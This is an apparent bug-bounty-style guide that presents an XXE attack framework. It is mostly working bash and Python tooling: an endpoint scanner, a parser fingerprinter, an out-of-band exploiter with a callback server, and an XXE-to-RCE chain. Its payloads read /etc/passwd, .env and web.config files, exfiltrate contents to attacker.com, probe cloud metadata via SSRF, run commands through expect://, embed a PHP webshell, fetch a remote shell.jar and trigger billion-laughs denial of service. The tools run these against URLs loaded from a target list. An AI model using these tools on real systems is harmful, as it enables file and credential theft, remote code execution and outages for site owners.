# 🔥 Elite XXE (XML External Entity) Injection Attack Framework
## Advanced Techniques for $1000+ Bug Bounty Rewards

### 🎯 Overview
XXE vulnerabilities are high-value targets that can lead to file disclosure, SSRF, RCE, and DoS attacks. This comprehensive framework covers everything from basic detection to advanced exploitation techniques used by elite red teams.

## 🛠️ Phase 1: XXE Discovery & Enumeration

### Automated XXE Endpoint Discovery
```bash
#!/bin/bash
# xxe_discovery.sh - Discover XML processing endpoints

TARGET=$1
echo "🔍 Discovering XML processing endpoints for $TARGET"

# Method 1: Common XML endpoints
cat > xml_endpoints.txt << 'EOF'
/api/xml
/xml
/soap
/webservice
/ws
/api/soap
/services
/service
/rpc
/xmlrpc
/api/v1/xml
/api/v2/xml
/upload/xml
/import/xml
/export/xml
/feed
/rss
/atom
/sitemap.xml
/config.xml
/settings.xml
/data.xml
/api/data
/api/import
/api/export
/api/upload
/admin/import
/admin/export
/user/import
/user/export
/file/import
/file/export
/document/upload
/document/import
/backup/import
/backup/restore
/migration/import
/sync/data
/integration/xml
/webhook
/callback
/notify
/notification
/api/webhook
/api/callback
/api/notify
EOF

# Test XML endpoints
echo "🎯 Testing XML endpoints..."
for url in $(cat live_urls.txt); do
    for path in $(cat xml_endpoints.txt); do
        full_url="$url$path"
        
        # Test with GET request
        response=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")
        if [[ "$response" == "200" || "$response" == "400" || "$response" == "500" ]]; then
            echo "✅ Found XML endpoint: $full_url ($response)"
            echo "$full_url" >> xml_processing_endpoints.txt
        fi
        
        # Test with POST request containing XML
        response=$(curl -s -X POST -H "Content-Type: application/xml" -d "<?xml version='1.0'?><test>data</test>" -o /dev/null -w "%{http_code}" "$full_url")
        if [[ "$response" == "200" || "$response" == "400" || "$response" == "500" ]]; then
            echo "✅ Found XML POST endpoint: $full_url ($response)"
            echo "$full_url" >> xml_post_endpoints.txt
        fi
    done
done

# Method 2: Content-Type based discovery
echo "🔍 Testing Content-Type based XML processing..."
for url in $(cat live_urls.txt); do
    # Test different XML content types
    content_types=(
        "application/xml"
        "text/xml"
        "application/soap+xml"
        "application/xhtml+xml"
        "application/rss+xml"
        "application/atom+xml"
        "application/rdf+xml"
        "application/xslt+xml"
    )
    
    for ct in "${content_types[@]}"; do
        response=$(curl -s -X POST -H "Content-Type: $ct" -d "<?xml version='1.0'?><test>data</test>" -o /dev/null -w "%{http_code}" "$url")
        if [[ "$response" == "200" || "$response" == "400" || "$response" == "500" ]]; then
            echo "✅ XML processing detected: $url with $ct ($response)"
            echo "$url|$ct" >> xml_content_type_endpoints.txt
        fi
    done
done

# Method 3: Parameter-based XML injection points
echo "🔍 Finding parameter-based XML injection points..."
cat live_urls.txt | gau | grep "=" | head -100 > potential_params.txt

while read url; do
    # Extract parameters
    params=$(echo "$url" | grep -oP '\?.*' | tr '&' '
' | cut -d'=' -f1 | tr -d '?')
    base_url=$(echo "$url" | cut -d'?' -f1)
    
    for param in $params; do
        # Test XML injection in parameter
        xml_payload="<?xml version='1.0'?><test>data</test>"
        test_url="${base_url}?${param}=${xml_payload}"
        
        response=$(curl -s "$test_url" -w "%{http_code}" -o /tmp/xxe_test_response.txt)
        if grep -q "xml\|XML\|parse\|entity" /tmp/xxe_test_response.txt; then
            echo "✅ XML parameter injection point: $base_url - parameter: $param"
            echo "$base_url|$param" >> xml_param_injection_points.txt
        fi
    done
done < potential_params.txt

# Method 4: File upload XML processing
echo "🔍 Testing file upload XML processing..."
if [ -f "upload_endpoints.txt" ]; then
    while read upload_url; do
        # Test XML file upload
        echo '<?xml version="1.0"?><test>data</test>' > test.xml
        
        response=$(curl -s -X POST -F "file=@test.xml" "$upload_url" -w "%{http_code}" -o /tmp/upload_response.txt)
        if grep -q "xml\|XML\|parse\|processed" /tmp/upload_response.txt; then
            echo "✅ XML file upload processing: $upload_url"
            echo "$upload_url" >> xml_upload_endpoints.txt
        fi
        
        rm -f test.xml
    done < upload_endpoints.txt
fi

echo "✅ XXE discovery completed!"
```

### Advanced XXE Endpoint Fingerprinting
```python
#!/usr/bin/env python3
# xxe_fingerprint.py - Advanced XXE endpoint fingerprinting

import requests
import xml.etree.ElementTree as ET
import time
import random
import string
from urllib.parse import urljoin

class XXEFingerprinter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # XML parsers and their characteristics
        self.parser_signatures = {
            'libxml2': ['libxml', 'xmlParseEntityRef', 'xmlParseInternalSubset'],
            'xerces': ['xerces', 'SAXParseException', 'org.apache.xerces'],
            'msxml': ['msxml', 'Microsoft.XMLDOM', 'MSXML2.DOMDocument'],
            'java': ['java.xml', 'javax.xml', 'SAXException', 'DocumentBuilder'],
            'python': ['xml.etree', 'xml.dom', 'xml.sax', 'lxml'],
            'php': ['DOMDocument', 'SimpleXML', 'XMLReader', 'libxml'],
            'nodejs': ['xml2js', 'libxmljs', 'xmldom', 'fast-xml-parser'],
            '.net': ['System.Xml', 'XmlDocument', 'XmlReader', 'XPathDocument']
        }
        
        # Test XML payloads for fingerprinting
        self.fingerprint_payloads = [
            # Basic XML
            '<?xml version="1.0"?><root>test</root>',
            
            # XML with DTD
            '<?xml version="1.0"?><!DOCTYPE root [<!ELEMENT root ANY>]><root>test</root>',
            
            # XML with external DTD (will fail but may reveal parser info)
            '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://nonexistent.com/test.dtd"><root>test</root>',
            
            # XML with internal entity
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "value">]><root>&test;</root>',
            
            # XML with parameter entity
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test "value">%test;]><root>test</root>',
            
            # Malformed XML
            '<?xml version="1.0"?><root><unclosed>test</root>',
            
            # XML with namespace
            '<?xml version="1.0"?><root xmlns:test="http://test.com"><test:element>value</test:element></root>',
            
            # XML with CDATA
            '<?xml version="1.0"?><root><![CDATA[test data]]></root>',
            
            # XML with processing instruction
            '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="style.xsl"?><root>test</root>',
            
            # Large XML (test size limits)
            '<?xml version="1.0"?><root>' + 'A' * 10000 + '</root>',
        ]
    
    def fingerprint_xml_endpoint(self, url, method='POST', content_type='application/xml'):
        """Comprehensive XML endpoint fingerprinting"""
        results = {
            'url': url,
            'method': method,
            'content_type': content_type,
            'parser_type': 'unknown',
            'supports_dtd': False,
            'supports_entities': False,
            'supports_external_entities': False,
            'error_messages': [],
            'response_times': [],
            'vulnerabilities': []
        }
        
        for payload in self.fingerprint_payloads:
            try:
                start_time = time.time()
                
                if method.upper() == 'POST':
                    response = self.session.post(
                        url, 
                        data=payload, 
                        headers={'Content-Type': content_type},
                        timeout=10
                    )
                else:
                    response = self.session.get(url, timeout=10)
                
                end_time = time.time()
                response_time = end_time - start_time
                results['response_times'].append(response_time)
                
                # Analyze response for parser signatures
                response_text = response.text.lower()
                for parser, signatures in self.parser_signatures.items():
                    if any(sig.lower() in response_text for sig in signatures):
                        results['parser_type'] = parser
                        print(f"🎯 Detected {parser} parser at {url}")
                
                # Check for DTD support
                if 'DOCTYPE' in payload and response.status_code == 200:
                    results['supports_dtd'] = True
                
                # Check for entity support
                if '&test;' in payload and 'value' in response.text:
                    results['supports_entities'] = True
                    print(f"✅ Entity processing confirmed at {url}")
                
                # Check for external entity support (error messages)
                if 'SYSTEM' in payload and response.status_code in [400, 500]:
                    if any(keyword in response_text for keyword in ['entity', 'dtd', 'external', 'network', 'connection']):
                        results['supports_external_entities'] = True
                        print(f"🔥 External entity support detected at {url}")
                
                # Collect error messages
                if response.status_code in [400, 500]:
                    error_keywords = ['error', 'exception', 'parse', 'xml', 'entity', 'dtd']
                    if any(keyword in response_text for keyword in error_keywords):
                        results['error_messages'].append(response.text[:500])
                
                # Check for potential vulnerabilities
                if 'malformed' in payload and response.status_code == 500:
                    results['vulnerabilities'].append('Parser crashes on malformed XML')
                
                if len(payload) > 5000 and response_time > 5:
                    results['vulnerabilities'].append('Potential DoS via large XML')
                
            except Exception as e:
                continue
        
        return results
    
    def test_xxe_vulnerability(self, url, method='POST', content_type='application/xml'):
        """Test for XXE vulnerabilities"""
        xxe_results = {
            'url': url,
            'vulnerable': False,
            'vulnerability_type': [],
            'payloads_successful': [],
            'file_disclosure': False,
            'ssrf_possible': False,
            'rce_possible': False
        }
        
        # XXE test payloads
        xxe_payloads = [
            # Basic file disclosure (Linux)
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
            
            # Basic file disclosure (Windows)
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>''',
            
            # Parameter entity file disclosure
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%xxe;'>">
%param;
%exfil;
]>
<root>test</root>''',
            
            # SSRF via HTTP
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>''',
            
            # SSRF via FTP
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "ftp://attacker.com/test">
]>
<root>&xxe;</root>''',
            
            # Expect wrapper (PHP)
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<root>&xxe;</root>''',
            
            # PHP filter wrapper
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>''',
            
            # Data URI
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">
]>
<root>&xxe;</root>''',
            
            # Billion laughs attack (DoS)
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>''',
            
            # External DTD with parameter entity
            '''<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">
<root>test</root>''',
        ]
        
        for payload in xxe_payloads:
            try:
                if method.upper() == 'POST':
                    response = self.session.post(
                        url, 
                        data=payload, 
                        headers={'Content-Type': content_type},
                        timeout=15
                    )
                else:
                    continue  # XXE typically requires POST
                
                # Check for file disclosure
                file_indicators = [
                    'root:x:0:0:',  # /etc/passwd
                    'daemon:x:1:1:',  # /etc/passwd
                    'localhost',  # hosts file
                    '127.0.0.1',  # hosts file
                    '# Copyright',  # Windows hosts
                ]
                
                if any(indicator in response.text for indicator in file_indicators):
                    xxe_results['vulnerable'] = True
                    xxe_results['file_disclosure'] = True
                    xxe_results['vulnerability_type'].append('File Disclosure')
                    xxe_results['payloads_successful'].append(payload[:100] + '...')
                    print(f"🔥 CRITICAL XXE FILE DISCLOSURE: {url}")
                
                # Check for SSRF
                ssrf_indicators = [
                    'instance-id',  # AWS metadata
                    'ami-id',  # AWS metadata
                    'security-credentials',  # AWS metadata
                    'metadata',  # Cloud metadata
                ]
                
                if any(indicator in response.text for indicator in ssrf_indicators):
                    xxe_results['vulnerable'] = True
                    xxe_results['ssrf_possible'] = True
                    xxe_results['vulnerability_type'].append('SSRF')
                    xxe_results['payloads_successful'].append(payload[:100] + '...')
                    print(f"🔥 CRITICAL XXE SSRF: {url}")
                
                # Check for RCE
                rce_indicators = [
                    'uid=',  # whoami output
                    'gid=',  # whoami output
                    'root',  # command output
                    'www-data',  # command output
                ]
                
                if 'expect://' in payload and any(indicator in response.text for indicator in rce_indicators):
                    xxe_results['vulnerable'] = True
                    xxe_results['rce_possible'] = True
                    xxe_results['vulnerability_type'].append('RCE')
                    xxe_results['payloads_successful'].append(payload[:100] + '...')
                    print(f"🔥 CRITICAL XXE RCE: {url}")
                
                # Check for base64 encoded content (PHP filter)
                if 'php://filter' in payload and len(response.text) > 50:
                    try:
                        import base64
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        if '<?php' in decoded or 'function' in decoded:
                            xxe_results['vulnerable'] = True
                            xxe_results['file_disclosure'] = True
                            xxe_results['vulnerability_type'].append('PHP Filter File Disclosure')
                            xxe_results['payloads_successful'].append(payload[:100] + '...')
                            print(f"🔥 CRITICAL XXE PHP FILTER: {url}")
                    except:
                        pass
                
                # Check for DoS (Billion laughs)
                if 'lol4' in payload and (response.elapsed.total_seconds() > 10 or response.status_code == 500):
                    xxe_results['vulnerable'] = True
                    xxe_results['vulnerability_type'].append('DoS (Billion Laughs)')
                    xxe_results['payloads_successful'].append(payload[:100] + '...')
                    print(f"🔥 XXE DoS VULNERABILITY: {url}")
                
            except requests.exceptions.Timeout:
                if 'lol4' in payload:
                    xxe_results['vulnerable'] = True
                    xxe_results['vulnerability_type'].append('DoS (Timeout)')
                    print(f"🔥 XXE DoS (Timeout): {url}")
            except Exception as e:
                continue
        
        return xxe_results

# Usage
def main():
    # Load endpoints from discovery
    endpoints = []
    
    # Load from different discovery files
    endpoint_files = [
        'xml_processing_endpoints.txt',
        'xml_post_endpoints.txt',
        'xml_content_type_endpoints.txt',
        'xml_upload_endpoints.txt'
    ]
    
    for file_path in endpoint_files:
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if '|' in line:
                        url, content_type = line.split('|', 1)
                        endpoints.append((url, content_type))
                    else:
                        endpoints.append((line, 'application/xml'))
        except FileNotFoundError:
            continue
    
    if not endpoints:
        print("❌ No XML endpoints found. Run xxe_discovery.sh first.")
        return
    
    fingerprinter = XXEFingerprinter()
    all_results = []
    
    for url, content_type in endpoints:
        print(f"🎯 Testing XXE on {url}")
        
        # Fingerprint the endpoint
        fingerprint_result = fingerprinter.fingerprint_xml_endpoint(url, 'POST', content_type)
        
        # Test for XXE vulnerabilities
        xxe_result = fingerprinter.test_xxe_vulnerability(url, 'POST', content_type)
        
        # Combine results
        combined_result = {**fingerprint_result, **xxe_result}
        all_results.append(combined_result)
    
    # Save results
    import json
    with open('xxe_test_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    # Print summary
    vulnerable_count = sum(1 for result in all_results if result.get('vulnerable', False))
    print(f"✅ XXE testing completed! Found {vulnerable_count} vulnerable endpoints")

if __name__ == "__main__":
    main()
```

## 💰 Phase 2: Advanced XXE Exploitation Techniques

### 1. Out-of-Band XXE (OOB-XXE) Framework
```python
#!/usr/bin/env python3
# oob_xxe_framework.py - Out-of-Band XXE exploitation

import requests
import threading
import time
import base64
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
import socketserver
import json

class OOBXXEHandler(BaseHTTPRequestHandler):
    """HTTP server to catch OOB XXE callbacks"""
    
    def do_GET(self):
        """Handle GET requests from XXE callbacks"""
        print(f"🔥 OOB XXE Callback received: {self.path}")
        
        # Log the request
        with open('oob_xxe_callbacks.log', 'a') as f:
            f.write(f"{time.ctime()}: GET {self.path} from {self.client_address[0]}
")
        
        # Extract data from URL parameters
        if '?' in self.path:
            query = self.path.split('?', 1)[1]
            params = urllib.parse.parse_qs(query)
            
            for key, values in params.items():
                for value in values:
                    try:
                        # Try to decode base64 data
                        decoded = base64.b64decode(value).decode('utf-8', errors='ignore')
                        print(f"📄 Decoded data: {decoded[:500]}...")
                        
                        # Save decoded data
                        with open(f'xxe_data_{int(time.time())}.txt', 'w') as f:
                            f.write(decoded)
                    except:
                        print(f"📄 Raw data: {value[:500]}...")
        
        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def do_POST(self):
        """Handle POST requests from XXE callbacks"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        print(f"🔥 OOB XXE POST Callback: {post_data[:500]}...")
        
        # Log the request
        with open('oob_xxe_callbacks.log', 'a') as f:
            f.write(f"{time.ctime()}: POST {self.path} - Data: {post_data[:200]}...
")
        
        # Save POST data
        with open(f'xxe_post_data_{int(time.time())}.txt', 'wb') as f:
            f.write(post_data)
        
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

class OOBXXEExploiter:
    def __init__(self, callback_server="http://attacker.com"):
        self.callback_server = callback_server
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Start callback server in background
        self.start_callback_server()
    
    def start_callback_server(self, port=8080):
        """Start HTTP server to catch OOB callbacks"""
        def run_server():
            try:
                with socketserver.TCPServer(("", port), OOBXXEHandler) as httpd:
                    print(f"🌐 OOB XXE callback server started on port {port}")
                    httpd.serve_forever()
            except Exception as e:
                print(f"❌ Failed to start callback server: {e}")
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        time.sleep(1)  # Give server time to start
    
    def generate_oob_xxe_payloads(self, target_file="/etc/passwd"):
        """Generate OOB XXE payloads for different scenarios"""
        
        # Basic OOB XXE with external DTD
        basic_oob = f'''<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "{self.callback_server}/evil.dtd">
<root>test</root>'''
        
        # Parameter entity OOB XXE
        param_entity_oob = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{self.callback_server}/?data=%file;'>">
%eval;
%exfil;
]>
<root>test</root>'''
        
        # Base64 encoded OOB XXE
        base64_oob = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{self.callback_server}/?data=%file;'>">
%eval;
%exfil;
]>
<root>test</root>'''
        
        # FTP-based OOB XXE
        ftp_oob = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:2121/?%file;'>">
%eval;
%exfil;
]>
<root>test</root>'''
        
        # HTTP POST OOB XXE
        post_oob = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{self.callback_server}/post?data=%file;'>">
%eval;
%exfil;
]>
<root>test</root>'''
        
        return {
            'basic_oob': basic_oob,
            'param_entity_oob': param_entity_oob,
            'base64_oob': base64_oob,
            'ftp_oob': ftp_oob,
            'post_oob': post_oob
        }
    
    def create_evil_dtd(self, target_file="/etc/passwd"):
        """Create evil DTD content for external DTD attacks"""
        
        # Basic evil DTD
        basic_dtd = f'''<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{self.callback_server}/?data=%file;'>">
%eval;
%exfil;'''
        
        # Base64 encoded evil DTD
        base64_dtd = f'''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={target_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{self.callback_server}/?data=%file;'>">
%eval;
%exfil;'''
        
        # Multi-file evil DTD
        multi_file_dtd = f'''<!ENTITY % file1 SYSTEM "file:///etc/passwd">
<!ENTITY % file2 SYSTEM "file:///etc/hosts">
<!ENTITY % file3 SYSTEM "file:///proc/version">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{self.callback_server}/?passwd=%file1;&hosts=%file2;&version=%file3;'>">
%eval;
%exfil;'''
        
        return {
            'basic_dtd': basic_dtd,
            'base64_dtd': base64_dtd,
            'multi_file_dtd': multi_file_dtd
        }
    
    def test_oob_xxe(self, url, content_type='application/xml'):
        """Test OOB XXE vulnerabilities"""
        results = []
        
        # Target files to extract
        target_files = [
            '/etc/passwd',
            '/etc/hosts',
            '/etc/hostname',
            '/proc/version',
            '/proc/cpuinfo',
            '/proc/meminfo',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/var/www/html/config.php',
            '/var/www/html/.env',
            'C:/windows/system32/drivers/etc/hosts',
            'C:/windows/win.ini',
            'C:/inetpub/wwwroot/web.config',
        ]
        
        for target_file in target_files:
            print(f"🎯 Testing OOB XXE for {target_file}")
            
            payloads = self.generate_oob_xxe_payloads(target_file)
            
            for payload_name, payload in payloads.items():
                try:
                    # Clear previous callbacks
                    open('oob_xxe_callbacks.log', 'w').close()
                    
                    # Send XXE payload
                    response = self.session.post(
                        url,
                        data=payload,
                        headers={'Content-Type': content_type},
                        timeout=10
                    )
                    
                    # Wait for callback
                    time.sleep(5)
                    
                    # Check for callbacks
                    try: 
                        with open('oob_xxe_callbacks.log', 'r') as f:
                            callbacks = f.read()
                            if callbacks:
                                results.append({
                                    'url': url,
                                    'target_file': target_file,
                                    'payload_type': payload_name,
                                    'callback_received': True,
                                    'callback_data': callbacks,
                                    'vulnerability': 'OOB XXE'
                                })
                                print(f"🔥 OOB XXE SUCCESS: {target_file} via {payload_name}")
                    except FileNotFoundError:
                        pass
                        
                except Exception as e:
                    continue
        
        return results
    
    def exploit_blind_xxe(self, url, content_type='application/xml'):
        """Exploit blind XXE vulnerabilities"""
        results = []
        
        # Blind XXE detection payloads
        blind_payloads = [
            # DNS-based detection
            f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{self.callback_server}/dns-test">
%xxe;
]>
<root>test</root>''',
            
            # HTTP-based detection
            f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{self.callback_server}/http-test">
]>
<root>&xxe;</root>''',
            
            # Time-based detection
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///dev/random">
]>
<root>&xxe;</root>''',
            
            # Error-based detection
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///nonexistent/file/path">
]>
<root>&xxe;</root>''',
        ]
        
        for i, payload in enumerate(blind_payloads):
            try:
                start_time = time.time()
                
                response = self.session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': content_type},
                    timeout=15
                )
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # Check for time-based indicators
                if response_time > 10:
                    results.append({
                        'url': url,
                        'payload_index': i,
                        'response_time': response_time,
                        'vulnerability': 'Blind XXE (Time-based)'
                    })
                    print(f"🔥 BLIND XXE (Time-based): {url}")
                
                # Check for error-based indicators
                if response.status_code in [400, 500]:
                    error_keywords = ['entity', 'dtd', 'external', 'parse', 'xml']
                    if any(keyword in response.text.lower() for keyword in error_keywords):
                        results.append({
                            'url': url,
                            'payload_index': i,
                            'error_response': response.text[:500],
                            'vulnerability': 'Blind XXE (Error-based)'
                        })
                        print(f"🔥 BLIND XXE (Error-based): {url}")
                
            except requests.exceptions.Timeout:
                results.append({
                    'url': url,
                    'payload_index': i,
                    'vulnerability': 'Blind XXE (Timeout)'
                })
                print(f"🔥 BLIND XXE (Timeout): {url}")
            except Exception as e:
                continue
        
        return results

# Usage
def main():
    # Load XML endpoints
    endpoints = []
    
    endpoint_files = [
        'xml_processing_endpoints.txt',
        'xml_post_endpoints.txt'
    ]
    
    for file_path in endpoint_files:
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        endpoints.append(line)
        except FileNotFoundError:
            continue
    
    if not endpoints:
        print("❌ No XML endpoints found. Run xxe_discovery.sh first.")
        return
    
    # Initialize OOB XXE exploiter
    exploiter = OOBXXEExploiter("http://YOUR_SERVER_IP:8080")  # Replace with your server
    all_results = []
    
    for url in endpoints:
        print(f"🎯 Testing OOB XXE on {url}")
        
        # Test OOB XXE
        oob_results = exploiter.test_oob_xxe(url)
        all_results.extend(oob_results)
        
        # Test Blind XXE
        blind_results = exploiter.exploit_blind_xxe(url)
        all_results.extend(blind_results)
    
    # Save results
    with open('oob_xxe_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print(f"✅ OOB XXE testing completed! Found {len(all_results)} vulnerabilities")

if __name__ == "__main__":
    main()
```

### 2. XXE to RCE Exploitation Chain
```python
#!/usr/bin/env python3
# xxe_to_rce.py - XXE to RCE exploitation chain

import requests
import base64
import time
import os
import tempfile

class XXEToRCEExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # RCE payloads for different platforms
        self.rce_payloads = {
            'php': {
                'expect': 'expect://whoami',
                'data_uri': 'data://text/plain;base64,' + base64.b64encode(b'<?php system($_GET["cmd"]); ?>').decode(),
                'filter_chain': 'php://filter/convert.iconv.utf-8.utf-16/resource=data://text/plain;base64,' + base64.b64encode(b'<?php system($_GET["cmd"]); ?>').decode(),
                'input': 'php://input',
                'phar': 'phar://shell.jpg/shell.php'
            },
            'java': {
                'file_upload': 'file:///tmp/shell.jsp',
                'jar': 'jar:file:///tmp/shell.jar!/shell.class',
                'netdoc': 'netdoc:///etc/passwd'
            },
            'dotnet': {
                'file': 'file:///C:/inetpub/wwwroot/shell.aspx',
                'res': 'res://shell.dll/shell.aspx'
            }
        }
    
    def test_xxe_to_rce(self, url, content_type='application/xml'):
        """Test XXE to RCE exploitation chains"""
        results = []
        
        # Test PHP-based RCE
        php_rce_results = self.test_php_xxe_rce(url, content_type)
        results.extend(php_rce_results)
        
        # Test Java-based RCE
        java_rce_results = self.test_java_xxe_rce(url, content_type)
        results.extend(java_rce_results)
        
        # Test .NET-based RCE
        dotnet_rce_results = self.test_dotnet_xxe_rce(url, content_type)
        results.extend(dotnet_rce_results)
        
        return results
    
    def test_php_xxe_rce(self, url, content_type):
        """Test PHP-specific XXE to RCE"""
        results = []
        
        # Test expect:// wrapper
        expect_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<root>&xxe;</root>'''
        
        try:
            response = self.session.post(url, data=expect_payload, headers={'Content-Type': content_type}, timeout=10)
            
            # Check for command execution indicators
            if any(indicator in response.text for indicator in ['uid=', 'gid=', 'www-data', 'apache', 'nginx']):
                results.append({
                    'url': url,
                    'method': 'expect:// wrapper',
                    'payload': expect_payload,
                    'response': response.text[:500],
                    'vulnerability': 'XXE to RCE (PHP expect)'
                })
                print(f"🔥 CRITICAL XXE to RCE (expect): {url}")
        except:
            pass
        
        # Test data:// URI with PHP code
        php_code = base64.b64encode(b'<?php system("whoami"); ?>').decode()
        data_payload = f'''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "data://text/plain;base64,{php_code}">
]>
<root>&xxe;</root>'''
        
        try:
            response = self.session.post(url, data=data_payload, headers={'Content-Type': content_type}, timeout=10)
            
            if any(indicator in response.text for indicator in ['uid=', 'gid=', 'www-data']):
                results.append({
                    'url': url,
                    'method': 'data:// URI',
                    'payload': data_payload,
                    'response': response.text[:500],
                    'vulnerability': 'XXE to RCE (PHP data URI)'
                })
                print(f"🔥 CRITICAL XXE to RCE (data URI): {url}")
        except:
            pass
        
        # Test PHP filter chains for RCE
        filter_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4=">
]>
<root>&xxe;</root>'''
        
        try:
            response = self.session.post(url, data=filter_payload, headers={'Content-Type': content_type}, timeout=10)
            
            if any(indicator in response.text for indicator in ['uid=', 'gid=', 'www-data']):
                results.append({
                    'url': url,
                    'method': 'PHP filter chain',
                    'payload': filter_payload,
                    'response': response.text[:500],
                    'vulnerability': 'XXE to RCE (PHP filter)'
                })
                print(f"🔥 CRITICAL XXE to RCE (filter): {url}")
        except:
            pass
        
        return results
    
    def test_java_xxe_rce(self, url, content_type):
        """Test Java-specific XXE to RCE"""
        results = []
        
        # Test jar:// protocol for RCE
        jar_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "jar:http://attacker.com/shell.jar!/shell.class">
]>
<root>&xxe;</root>'''
        
        try:
            response = self.session.post(url, data=jar_payload, headers={'Content-Type': content_type}, timeout=10)
            
            # Check for Java-specific indicators
            if any(indicator in response.text for indicator in ['java.', 'javax.', 'ClassNotFoundException', 'NoClassDefFoundError']):
                results.append({
                    'url': url,
                    'method': 'jar:// protocol',
                    'payload': jar_payload,
                    'response': response.text[:500],
                    'vulnerability': 'XXE to RCE (Java jar)'
                })
                print(f"🔥 XXE to RCE (Java jar): {url}")
        except:
            pass
        
        # Test netdoc:// protocol (older Java versions)
        netdoc_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
]>
<root>&xxe;</root>'''
        
        try:
            response = self.session.post(url, data=netdoc_payload, headers={'Content-Type': content_type}, timeout=10)
            
            if 'root:x:0:0:' in response.text:
                results.append({
                    'url': url,
                    'method': 'netdoc:// protocol',
                    'payload': netdoc_payload,
                    'response': response.text[:500],
                    'vulnerability': 'XXE File Disclosure (Java netdoc)'
                })
